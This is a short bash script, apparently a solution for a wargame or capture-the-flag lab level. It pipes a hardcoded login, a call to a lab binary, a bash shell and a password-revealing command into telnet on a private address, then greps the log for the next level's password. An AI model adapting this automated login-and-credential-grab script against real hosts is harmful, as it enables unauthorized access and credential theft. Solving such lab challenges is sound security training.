#!/bin/bash
# Description:
# This is Remote Exploit tool to get level2's password

export TERM=xterm           # echo $TERM
export LANG=en_US.UTF-8     # echo $LANG
export IP1=192.168.10.240
export PORT1=23
export USER1="level1"
export PASS1="level1"
export CMD1="/bin/ExecuteMe"
export CMD2="/bin/bash"
export CMD3="/bin/my-pass"
export LOG1="level1.log"

attack() {
	sleep 2; echo "$PASS1"
	sleep 1; echo "$CMD1"
	sleep 1; echo "$CMD2"
	sleep 1; echo "$CMD3"
	sleep 1; echo "exit"
	sleep 1; echo "exit"
}

> $LOG1 && echo "[*] Log file created."
echo "[*] Level1 attack started. Please wait...."
attack | telnet -l $USER1 $IP1 $PORT1 >> $LOG1 2>&1 

echo "[+] Level2 password cracked."
grep 'Level2 Password' $LOG1
